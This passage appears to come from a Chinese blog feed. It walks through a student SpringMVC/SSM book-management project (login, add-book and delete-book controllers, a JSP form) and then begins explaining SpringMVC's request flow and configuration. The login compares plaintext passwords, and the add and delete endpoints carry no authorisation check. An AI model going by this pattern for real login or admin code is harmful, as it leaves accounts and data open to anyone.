class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> adminService adminService;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> BookService bookService;<br><br>    <span class="hljs-comment">//check user</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/book_manage_2&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">login</span><span class="hljs-params">(admin admin, Model model)</span> </span>&#123;<br>        admin = adminService.checkLogin(admin.getAdmin_id(), admin.getPassword());<br>        <span class="hljs-keyword">if</span> (admin != <span class="hljs-keyword">null</span>) &#123;<br>            List&lt;book_info&gt; list = bookService.queryAllBook();<br>            model.addAttribute(<span class="hljs-string">&quot;list&quot;</span>, list);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;book_manage&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在Service层的核心代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> admin <span class="hljs-title">checkLogin</span><span class="hljs-params">(<span class="hljs-keyword">int</span> admin_id, String password)</span> </span>&#123;<br>        admin admin = adminMapper.queryadminById(admin_id);<br>        <span class="hljs-keyword">if</span>(admin!=<span class="hljs-keyword">null</span>&amp;&amp;admin.getPassword().equals(password))&#123;<br>            <span class="hljs-keyword">return</span> admin;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Service层删减了部分代码，其余具体代码请看<a href="https://1905060202.github.io/2021/06/12/%E5%9F%BA%E4%BA%8ESSM-BootStrap%E7%9A%84%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE/">点我白嫖</a></p><p>在login.jsp页面：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;form action=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath&#125;/book/book_manage_2&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-horizontal &quot;</span> role=<span class="hljs-string">&quot;form&quot;</span>&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;<br>        &lt;label class=&quot;col-sm-2 control-label&quot;&gt;账号：&lt;/label&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-10&quot;</span>&gt;<br>            &lt;input id=<span class="hljs-string">&quot;zh&quot;</span> type=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-control&quot;</span> placeholder=<span class="hljs-string">&quot;账号&quot;</span> name=<span class="hljs-string">&quot;admin_id&quot;</span>&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;<br>        &lt;label id=&quot;pwd&quot; class=&quot;col-sm-2 control-label&quot;&gt;密码：&lt;/label&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-10&quot;</span>&gt;<br>            &lt;input id=<span class="hljs-string">&quot;pwd_real&quot;</span> type=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-control&quot;</span> placeholder=<span class="hljs-string">&quot;密码&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span>&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;<br>    &lt;/div&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;<br>        &lt;div  <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-offset-2 col-sm-5&quot;</span>&gt;<br>            &lt;button id=&quot;login&quot; type=&quot;submit&quot; class=&quot;btn btn-success&quot;&gt; 登录 &lt;/button&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>&lt;/form&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    $(<span class="hljs-string">&quot;#login&quot;</span>).click(<span class="hljs-function">function <span class="hljs-title">checkpwdAndzh</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">var</span> name = $(<span class="hljs-string">&quot;#zh&quot;</span>).val();<br>        <span class="hljs-keyword">var</span> pass = $(<span class="hljs-string">&quot;#pwd_real&quot;</span>).val();<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            alert(<span class="hljs-string">&quot;用户名不能为空&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pass == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            alert(<span class="hljs-string">&quot;密码不能为空&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125; <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>    &#125;);<br><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>login.jsp层删减了部分代码，只留下核心代码。</p><p>逻辑如代码所示，只是在实现的过程中碰到了一些棘手的问题。比如，通过ModelAndView向前端传递参数来实现登录成功与否的提示弹窗存在一些目前难以解决的逻辑bug。例如：登陆成功后，依然会弹出登陆失败的提示。碍于技术水平，此问题暂未得到解决，索性移除了弹窗提示。</p><h2 id="关于上架图书逻辑"><a href="#关于上架图书逻辑" class="headerlink" title="关于上架图书逻辑"></a>关于上架图书逻辑</h2><p>首先来看登陆后，form表单提交的地址：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;form action=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath&#125;/book/book_manage_2&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-horizontal &quot;</span> role=<span class="hljs-string">&quot;form&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>再来看一下配置了/book/book_manage_2的Controller：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/book&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">adminController</span> </span>&#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> adminService adminService;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> BookService bookService;<br><br>    <span class="hljs-comment">//check user</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/book_manage_2&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">login</span><span class="hljs-params">(admin admin, Model model)</span> </span>&#123;<br>        admin = adminService.checkLogin(admin.getAdmin_id(), admin.getPassword());<br>        <span class="hljs-keyword">if</span> (admin != <span class="hljs-keyword">null</span>) &#123;<br>            List&lt;book_info&gt; list = bookService.queryAllBook();<br>            model.addAttribute(<span class="hljs-string">&quot;list&quot;</span>, list);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;book_manage&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>登陆成功后，请求地址为:</p><blockquote><p><a href="http://localhost:8080/ssm_build_book_war_exploded/book/book_manage_2">http://localhost:8080/ssm_build_book_war_exploded/book/book_manage_2</a></p></blockquote><p>当我们选择上架图书模块时：</p><p><img src="/images/JavaScript/image-20210615172401967.png"></p><p>请求地址如图所示。</p><p>而此路径的配置在book_manage这个Controller里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/book&quot;)</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book_manage</span> </span>&#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> BookService bookService;<br>    <span class="hljs-meta">@RequestMapping(&quot;/book_manage&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">get_Book_manage</span><span class="hljs-params">()</span></span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;book_manage&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">// just return add_book page</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/add_book&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add_book_page</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;add_book&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">// just return delete_book page</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/delete_book&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">delete_book_page</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;delete_book&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//return admin book manage page</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/admin_overview_book&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">back_overview</span><span class="hljs-params">(Model model)</span></span>&#123;<br>        List&lt;book_info&gt; list = bookService.queryAllBook();<br>        model.addAttribute(<span class="hljs-string">&quot;list&quot;</span>,list);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;book_manage&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//implement add_book function</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/real_add_book&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add_book</span><span class="hljs-params">(book_info book,Model model)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> check = bookService.addbook(book);<br>        <span class="hljs-keyword">if</span> (check&gt;<span class="hljs-number">0</span>)&#123;<br>            List&lt;book_info&gt; list = bookService.queryAllBook();<br>            model.addAttribute(<span class="hljs-string">&quot;list&quot;</span>,list);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;book_manage&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;add_book&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//implement delete_book function</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/real_delete_book&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">delete_book</span><span class="hljs-params">(String book_id,Model model)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> check = bookService.deleteBookById(Integer.parseInt(book_id));<br>        <span class="hljs-keyword">if</span> (check&gt;<span class="hljs-number">0</span>)&#123;<br>            List&lt;book_info&gt; list = bookService.queryAllBook();<br>            model.addAttribute(<span class="hljs-string">&quot;list&quot;</span>,list);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;book_manage&quot;</span>;<br>        &#125;<br>        model.addAttribute(<span class="hljs-string">&quot;check&quot;</span>,<span class="hljs-string">&quot;fail&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;delete_book&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述为图书管理的整体配置(此时更新图书功能还未实现)，我们摘出与上架图书有关的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//implement add_book function</span><br>   <span class="hljs-meta">@RequestMapping(&quot;/real_add_book&quot;)</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add_book</span><span class="hljs-params">(book_info book,Model model)</span></span>&#123;<br>       <span class="hljs-keyword">int</span> check = bookService.addbook(book);<br>       <span class="hljs-keyword">if</span> (check&gt;<span class="hljs-number">0</span>)&#123;<br>           List&lt;book_info&gt; list = bookService.queryAllBook();<br>           model.addAttribute(<span class="hljs-string">&quot;list&quot;</span>,list);<br>           <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;book_manage&quot;</span>;<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;add_book&quot;</span>;<br>   &#125;<br><span class="hljs-comment">// just return add_book page</span><br>   <span class="hljs-meta">@RequestMapping(&quot;/add_book&quot;)</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add_book_page</span><span class="hljs-params">()</span></span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;add_book&quot;</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>可以看到，跳转到add_book.jsp的方法有两种。但是这两种方法的作用并不相同。对于第二种方法，其主要的作用就是实现页面跳转，并不包含传参。之所以这么设计，是因为单纯的页面跳转并不需要传递参数，而上架图书功能需要传参，需要通过Service访问数据库。如果将两者统一为一个方法，那么在页面跳转的时候会因为没有携带参数而出现错误。什么时候需要单纯的跳转页面呢？很简单，我们的第一次访问上架图书功能模块，这个跳转，并不需要参数。</p><p>上架图书逻辑图如下：</p><p><img src="/images/JavaScript/add_book_flush_chart.png"></p><h2 id="关于下架图书逻辑"><a href="#关于下架图书逻辑" class="headerlink" title="关于下架图书逻辑"></a>关于下架图书逻辑</h2><p>下架图书与上架图书的Controller构造基本相同(本身他们也在同一个Controller内)。同样的，需要两个方法，一个实现传参，一个单纯的用于跳转。过多细节不再赘述，具体内容请看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-comment">//implement delete_book function</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/real_delete_book&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">delete_book</span><span class="hljs-params">(String book_id,Model model)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> check = bookService.deleteBookById(Integer.parseInt(book_id));<br>        <span class="hljs-keyword">if</span> (check&gt;<span class="hljs-number">0</span>)&#123;<br>            List&lt;book_info&gt; list = bookService.queryAllBook();<br>            model.addAttribute(<span class="hljs-string">&quot;list&quot;</span>,list);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;book_manage&quot;</span>;<br>        &#125;<br>        model.addAttribute(<span class="hljs-string">&quot;check&quot;</span>,<span class="hljs-string">&quot;fail&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;delete_book&quot;</span>;<br>    &#125;<br><span class="hljs-comment">// just return delete_book page</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/delete_book&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">delete_book_page</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;delete_book&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web开发 </tag>
            
            <tag> 框架 </tag>
            
            <tag> SpringMVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解SpringMVC执行原理</title>
      <link href="/2021/06/12/%E8%AF%A6%E8%A7%A3SpringMVC%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86/"/>
      <url>/2021/06/12/%E8%AF%A6%E8%A7%A3SpringMVC%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="详解SpringMVC执行原理"><a href="#详解SpringMVC执行原理" class="headerlink" title="详解SpringMVC执行原理"></a>详解SpringMVC执行原理</h2><p><img src="/images/JavaScript/SpringMVC%E6%B5%81%E7%A8%8B%E5%9B%BE-1623506202049.png"></p><p>图为SpringMVC的一个比较完整的流程图，实线表示SpringMVC框架提供的技术，不需要开发者实现，虚线表示需要开发者实现。</p><h3 id="简要分析执行流程"><a href="#简要分析执行流程" class="headerlink" title="简要分析执行流程"></a>简要分析执行流程</h3><ol><li><p>DIspatcherServlet表示前置控制器，是整个SpringMVC的控制中心。用户发出请求，DIspatcherServlet接收请求并拦截请求。我们假设请求的url为：localhost:8080/SpringMVC/hello。如上url拆分成三部分：</p><ul><li>http:localhost:8080服务器域名</li><li>SpringMVC部署在服务器上的web站点</li><li>hello表示控制器</li></ul><p>通过分析，如上url表示为：请求位于服务器localhost:8080上的SpringMVC站点的hello控制器。</p></li><li><p>HandlerMapping为处理器映射。DIspatcherServlet调用HandleMapping，HandlerMapping根据请求url查找Handler。</p></li><li><p>HandlerExecution表示具体的的Handler，其主要作用是根据url查找控制器，如上url被查找控制器为：hello。</p></li><li><p>HandlerExecution将解析后的信息传递给DIspatcherServlet，如解析控制器映射等。</p></li><li><p>HandlerAdapter表示处理器适配器，其按照特定的规则去执行Handler。</p></li><li><p>Handler让具体的Controller执行</p></li><li><p>Controller将具体的执行信息返回给HandlerAdapter，如ModelAndView。</p></li><li><p>HandlerAdapter将视图逻辑名或模型传给DIspatcherServlet</p></li><li><p>DIspatcherServlet调用视图解析器(ViewResolver)来解析HandlerAdapter传递的逻辑视图名。</p></li><li><p>视图解析器将解析的逻辑视图名传给DIspatcherServlet</p></li><li><p>DIspatcherServlet根据视图解析器解析的视图结果，调用具体的视图。</p></li><li><p>最终视图呈现给用户</p></li></ol><h3 id="关于SpringMVC的配置（结合上面的流程来理解）"><a href="#关于SpringMVC的配置（结合上面的流程来理解）" class="headerlink" title="关于SpringMVC的配置（结合上面的流程来理解）"></a>关于SpringMVC的配置（结合上面的流程来理解）</h3><ol><li><p>首先在web.xml中配置DIspatcherServlet</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springmvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>     //绑定文件，方便以后直接使用<br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>            //resource下的applicationContext.xml<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>     <br>        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>   //用户发出的请求都会被它接收、拦截  <br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springmvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>对于Spring-mvc.xml的配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:mvc</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-tag"><span class="hljs-string">   http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-tag"><span class="hljs-string">   http://www.springframework.org/schema/context</span></span><br><span class="hljs-tag"><span class="hljs-string">   http://www.springframework.org/schema/context/spring-context.xsd</span></span><br><span class="hljs-tag"><span class="hljs-string">   http://www.springframework.org/schema/mvc</span></span><br><span class="hljs-tag"><span class="hljs-string">   https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--1.note driver--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:annotation-driven</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--2.static resource filter--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:default-servlet-handler</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--3.scan controller--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.hu.controller&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--view--&gt;</span><br>    <span class="hljs-comment">&lt;!--视图解析器</span><br><span class="hljs-comment">1.获取了ModelAndView的数据</span><br><span class="hljs-comment">2.解析ModelAndView的视图名字</span><br><span class="hljs-comment">3.拼接视图名字、找到对应的视图</span><br><span class="hljs-comment">4.将数据渲染到视图上--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;prefix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/WEB-INF/jsp/&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;suffix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;.jsp&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>解释7、8、9、10、11步：</li></ul><ol><li>在Controller中return了一个视图(“login”)，并且通过Model返回了数据(也可以说是ModelAndView，比如一个list集合)。HandlerAdapter把这些信息给了DIspatcherServlet(model:一个list集合，view:”login” – 